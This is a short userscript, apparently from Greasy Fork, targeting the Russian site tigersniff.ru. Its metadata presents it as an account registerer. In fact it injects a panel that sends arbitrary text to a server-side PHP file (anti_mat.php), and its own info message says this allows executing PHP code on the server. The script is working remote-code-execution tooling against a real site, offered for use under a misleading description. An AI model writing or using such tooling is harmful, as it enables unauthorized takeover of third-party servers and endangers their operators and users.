// ==UserScript==
// @name         TigerSniffREGGER
// @namespace    http://tigersniff.ru/
// @version      0.1
// @description  Реггер новых аккаунтов на TigerSniff
// @author       DimaRRR
// @match        http://tigersniff.ru/
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/15615/TigerSniffREGGER.user.js
// @updateURL https://update.greasyfork.org/scripts/15615/TigerSniffREGGER.meta.js
// ==/UserScript==
$("body").append('<script>function inform() {	TANKICHAT.plugins.mainWindow.message("Информация", "Разработчик скрипта: DimaRRR.<br/>Имеется возможность выполнение PHP кода на сервере.<br/>Для этого введите код в поле Выполнить и нажмите кнопку Выполнить.");}function evalSend() {    $.ajax({        type: "POST",        url: "../tmp/m_chat/anti_mat.php",        data: {            p: $("#evalSend").val()        },		success: function(html) {            TANKICHAT.plugins.mainWindow.message("Выполнение", "" + html + "");        }    });}</script><style>.mainRegger {    background-color: rgb(63,63,63);    color: white;    background-image: url(../img/inputs/bgrass.png);    border: 1px solid #000;    border-radius: 10px 0px 0px 0px;    -webkit-border-radius: 0px 10px 0px 0px;    padding: 10px;    width: 560px;    position: fixed;    left: 0px;    bottom: 0px;    margin: 0px;    width: 570px;    height: 115px;}</style><div class="mainRegger">   <div id="subChat-closebar">      TigerSniff   </div>   <div class="mainNew">      <table>         <tbody>			<tr>               <td><font color="white">Выполнить</font></td>               <td><input type="text" id="evalSend" style="width: 450px; left: -5px; margin-top: 3px; position: relative;"></td>            </tr>         </tbody>      </table>      <span class="f-buttons" style="top: 2px; left: -2px; position: relative;">	  <span class="f-bu f-bu-success" onclick="evalSend();">Выполнить</span>	  <span class="f-bu f-bu-warning" onclick="inform();">Информация</span>	  </span>   </div></div>');